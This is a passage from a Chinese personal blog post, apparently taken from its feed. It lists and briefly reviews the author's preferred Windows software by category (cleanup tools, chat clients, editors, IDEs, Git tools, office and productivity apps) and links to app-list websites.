用的 Groove 的界面，持续关注中</p>
<h2 id="电脑优化与安全">电脑优化与安全</h2>
<h3 id="火绒">火绒</h3>
<p>&ldquo;麻雀虽小，五脏俱全。&rdquo;
一款来自国内的安全软件，小巧不流氓
<del>甚至已经代替了我的垃圾清理软件</del></p>
<h3 id="ccleaner">CCleaner</h3>
<p>清理垃圾用
梨子家的软件都不错，免费版的也都够用</p>
<h3 id="wise-care-365"><del>wise care 365</del></h3>
<p><del>清理垃圾之类的，可以认为是……国外良心版 360</del></p>
<h2 id="美化">美化</h2>
<h3 id="任务栏透明插件"><del>任务栏透明插件</del></h3>
<p>如有需要请左转 TranslucentTB</p>
<h3 id="splash">Splash</h3>
<p>🚀UWP
一个应用，有广告但不影响使用
图片来自全球第二的壁纸提供网站<a href="https://unsplash.com">splash</a>，<del>每天</del> 过一个小时就换一张壁纸还不是美滋滋？</p>
<h2 id="沟通交流">沟通交流</h2>
<h3 id="tim">Tim</h3>
<p>一个只能说比 QQ 好用的客户端</p>
<h3 id="qq">QQ</h3>
<p>🚀UWP
不想打开 tim 时用这个，功能缺失极其严重</p>
<h3 id="ssr"><del>ssr</del></h3>
<p>这个也能认为是用来沟通……的吧？</p>
<h3 id="telegram-desktop">Telegram Desktop</h3>
<p>🚀UWP
我游特色（</p>
<h3 id="unigram">Unigram</h3>
<p>🚀UWP
telegram 的第三方客户端，1520 上在用，电脑上没怎么用</p>
<h3 id="知乎-uwp--zhihunew">知乎 UWP &amp; zhihu.new</h3>
<p>🚀UWP
第三方 uwp 客户端，没事时可以看看段子啥的
<del>虽然现在都是用网页版</del></p>
<h2 id="解压">解压</h2>
<h3 id="bandzip">Bandzip</h3>
<p>比之 360 之类好用的多</p>
<h2 id="编辑器">编辑器</h2>
<h3 id="notepad">Notepad++</h3>
<p>文本编辑器，处理些文件时用(eg. <code>_config.yml</code>)</p>
<h3 id="visual-studio-code">Visual Studio Code</h3>
<p>&ldquo;重新定义编辑&rdquo;
微软出品，跨平台，极其好用
<del>配合扩展甚至能干翻某些 IDE</del></p>
<h3 id="yu-writer">Yu Writer</h3>
<p>写 markdown 用，十分舒心</p>
<h3 id="vim">vim</h3>
<p>装在 ubuntu 子系统上的，还行</p>
<h3 id="simplenote">Simplenote</h3>
<p>背靠 wordpress，云同步强大，支持 markdown。
拿来局部替代 OneNote 做些笔记</p>
<h2 id="ide">IDE</h2>
<h3 id="visual-studio">Visual Studio</h3>
<p>宇宙第一 IDE！乌拉！</p>
<h3 id="intellij-idea">Intellij IDEA</h3>
<p>写 Java 用，JetBrains 家的 IDE 都还不错的
<del>可乱码又是什么鬼啊！</del></p>
<h2 id="编程相关">编程相关</h2>
<h3 id="open-wsl">open-wsl</h3>
<p>用来代替自带的 ubuntu 终端~</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>                           ./+o+-
</span></span><span style="display:flex;"><span>                   yyyyy- -yyyyyy+
</span></span><span style="display:flex;"><span>                ://+//////-yyyyyyo
</span></span><span style="display:flex;"><span>            .++ .:/++++++/-.+sss/<span style="color:#e6db74">`</span>
</span></span><span style="display:flex;"><span>          .:++o:  /++++++++/:--:/-
</span></span><span style="display:flex;"><span>         o:+o+:++.<span style="color:#e6db74">`</span>..<span style="color:#e6db74">```</span>.-/oo+++++/
</span></span><span style="display:flex;"><span>        .:+o:+o/.          <span style="color:#e6db74">`</span>+sssoo+/
</span></span><span style="display:flex;"><span>   .++/+:+oo+o:<span style="color:#e6db74">`</span>             /sssooo.
</span></span><span style="display:flex;"><span>  /+++//+:<span style="color:#e6db74">`</span>oo+o               /::--:.
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">\+</span>/+o+++<span style="color:#e6db74">`</span>o++o               ++////.
</span></span><span style="display:flex;"><span>   .++.o+++oo+:<span style="color:#e6db74">`</span>             /dddhhh.
</span></span><span style="display:flex;"><span>        .+.o+oo:.          <span style="color:#e6db74">`</span>oddhhhh+
</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\+</span>.++o+o<span style="color:#e6db74">``</span>-<span style="color:#e6db74">````</span>.:ohdhhhhh+
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">`</span>:o+++ <span style="color:#e6db74">`</span>ohhhhhhhhyo++os:
</span></span><span style="display:flex;"><span>            .o:<span style="color:#e6db74">`</span>.syhhhhhhh/.oo++o<span style="color:#e6db74">`</span>
</span></span><span style="display:flex;"><span>                /osyyyyyyo++ooo+++/
</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">`````</span> +oo+++o<span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>                           <span style="color:#e6db74">`</span>oo++.
</span></span></code></pre></div><h3 id="git">Git</h3>
<p>版本控制~</p>
<h3 id="sourcetree">SourceTree</h3>
<p>一个 Git 的 GUI 客户端，比 GitHub Desktop 功能更加强大</p>
<h3 id="nodejs">Node.js</h3>
<p>配置 Hexo 环境必须要用= =</p>
<h3 id="cmder">cmder</h3>
<p>起码比默认 cmd 好看= =</p>
<h3 id="vboxvmware"><del>vbox</del>VMware</h3>
<p>虚拟机，不过基本没啥用</p>
<h3 id="pentest-box">Pentest Box</h3>
<p>渗透环境咯</p>
<h2 id="文档图片">文档&amp;图片</h2>
<h3 id="office-全家桶">office 全家桶</h3>
<p><del>用的 kms 激活</del>
教育邮箱美滋滋</p>
<h3 id="office-三件套-mobile-版">office 三件套 mobile 版</h3>
<p>Microsoft store 获取，需 office365 订阅（教育邮箱美滋滋）
功能较 office 2016 少了不少，但能满足普通需求了</p>
<h3 id="photoshop">Photoshop</h3>
<p>业界最强，<del>没怎么用过就是了</del></p>
<h3 id="font-candy黄油相机"><del>Font Candy</del>黄油相机</h3>
<p>🚀UWP
给图片加字，岂不美哉？</p>
<h3 id="screentogif">ScreenToGif</h3>
<p>录屏并将其转为 gif 图片，赞！</p>
<h3 id="sumatrapdf">SumatraPDF</h3>
<p>支持多种电子书格式，开源，小巧</p>
<h3 id="onenote">OneNote</h3>
<p>🚀UWP
笔记神器！同步起来还是不错的。</p>
<h3 id="simplenote-1">simplenote</h3>
<p><del>搜狗浏览器乱入</del>图标值得吐槽
但本身很好用，多端同步、版本历史、无限存储、Markdown 支持。</p>
<h2 id="效率软件">效率软件</h2>
<h3 id="listary">listary</h3>
<p>双击<code>ctrl</code>键极为好用</p>
<h3 id="capslock">CapsLock+</h3>
<p>将 Capslock 键变为修饰键，对文字处理（包括写代码）极为好用</p>
<h3 id="snipaste">Snipaste</h3>
<p>🚀UWP
截图&amp;贴图软件，满足了很大的需求</p>
<h3 id="quicklook">QuickLook</h3>
<p>🚀UWP
按空格键预览，在某些环境下非常方便</p>
<h2 id="引申">引申</h2>
<p><a href="https://sspai.com/post/41411">少数派的这篇文章</a></p>
<h2 id="一些网站">一些网站</h2>
<ul>
<li><a href="https://windowsapp.org">Windows 绝赞应用</a></li>
<li><a href="https://github.com/Awesome-Windows/Awesome/blob/master/README-cn.md">awesome windows</a></li>
<li><a href="https://github.com/stackia/best-windows-apps">best windows app</a></li>
<li><a href="http://ilxdh.com">龙轩导航</a></li>
</ul>
<h2 id="结语">结语</h2>
<p><del>此外，由于很长时间都未使用 Windows 系统，软件列表有所疏漏，还望海涵。</del>
适合自己的才是最好的，因此在这里列出的也就仅仅是对<strong>我</strong>非常好用的软件。</p>
<hr>
<p>以上</p>
<p>本文将持续更新=。=（大概</p>
]]></content><category scheme="https://blog.batkiz.com/tags/windows" term="windows" label="windows"/></entry></feed>